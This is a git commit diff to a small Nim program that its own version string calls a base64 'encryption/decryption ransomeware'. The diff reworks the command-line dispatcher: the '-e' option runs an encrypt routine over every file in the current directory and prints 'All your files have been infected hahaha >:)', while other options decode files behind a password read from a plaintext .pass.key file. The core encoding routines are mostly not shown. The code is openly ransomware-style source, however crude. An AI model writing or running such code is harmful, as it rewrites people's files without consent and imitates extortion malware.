0c402bbd4d2e5ad5971a90c048807809ba88e934
kiavash ferdousi <94112071+petranol@users.noreply.github.com>
2022-06-03 01:14:20 -0400

    fixed some bugs

--- enc.nim
+++ enc.nim
@@ -41,35 +41,45 @@ proc decrypt(len:int,fstr:SinglyLinkedList[string]) : void =
         writeFile(file,st)
 
 var a = get_file()
-if paramStr(1) == "--enc" or paramStr(1) == "-e":
-    encrypt(len(a),a)
-    echo "All your files have been infected hahaha >:)"
-elif paramStr(1) == "-te" or paramStr(1) == "--textenc":
-    let a = readLine(stdin)
-    echo encode(a)
-elif paramStr(1) == "-td" or paramStr(1) == "--textdec":
-    let a = readLine(stdin)
-    echo decode(a)
-elif paramStr(1) == "-d" or paramStr(1) == "--dec":
-    if paramCount() >= 2:  
-        if paramStr(2) == "-p":
-            var pass = readFile(".pass.key")
-            var ab:string = readLine(stdin)
-            if ab == pass:
-                decrypt(len(a),a)   
-    else: 
-        decrypt(len(a),a)
-    echo "Your files have been decoded and safe and have great time"
-elif paramStr(1) == "-dp":
-    var pass = readFile(".pass.key")
-    var ab = readLine(stdin)
-    if ab == pass:
-        decrypt(len(a),a) 
-elif paramStr(1) == "-v" or paramStr(1) == "--version":
-    echo "version 0.0.1 of nim file encryption/decryption (to/from base64-encoding) ransomeware"
-elif paramStr(1) == "-h" or paramStr(1) == "--help":
-    echo "-e | --enc : encrypts all file in the same directory"
-    echo "-d | --dec [option = -p (with password the password is in .pass.key)] : decrypts all file in the same directory"
-    echo "-v | --version : prints the version of the software"
+if paramCount() >= 1:
+    if paramStr(1) == "--enc" or paramStr(1) == "-e":
+        encrypt(len(a),a)
+        echo "All your files have been infected hahaha >:)"
+    elif paramStr(1) == "-te" or paramStr(1) == "--textenc":
+        stdout.write("text: ")
+        let a = readLine(stdin)
+        echo encode(a)
+    elif paramStr(1) == "-td" or paramStr(1) == "--textdec":
+        stdout.write("coded text: ")
+        let a = readLine(stdin)
+        echo decode(a)
+    elif paramStr(1) == "-d" or paramStr(1) == "--dec":
+        if paramCount() >= 2:  
+            if paramStr(2) == "-p":
+                stdout.write("pass word: ")
+                var pass = readFile(".pass.key")
+                var ab:string = readLine(stdin)
+                if ab == pass:
+                    decrypt(len(a),a)   
+        else: 
+            decrypt(len(a),a)
+        echo "Your files have been decoded and safe and have great time"
+    elif paramStr(1) == "-dp" or paramStr(1) == "--decp":
+        stdout.write("pass word: ")
+        var pass = readFile(".pass.key")
+        var ab = readLine(stdin)
+        if ab == pass:
+            decrypt(len(a),a) 
+    elif paramStr(1) == "-v" or paramStr(1) == "--version":
+        echo "version 0.0.1 of nim file encryption/decryption (to/from base64-encoding) ransomeware"
+    elif paramStr(1) == "-h" or paramStr(1) == "--help":
+        echo "-e  | --enc     : encrypts all file in the same directory"
+        echo "-d  | --dec [option = -p (with password the password is in .pass.key)] : decrypts all file in the same directory"
+        echo "-te | --textenc : encrypts text given as input"
+        echo "-td | --textdec : decrypts coded text given as input"
+        echo "-v  | --version : prints the version of the software"
+        echo "-h  | --help : show all commands that can be excuted"
+    else:
+        echo "command ",paramStr(1)," not found"
 else:
-    echo "command ",paramStr(1)," not found"
+    echo "no command specified"
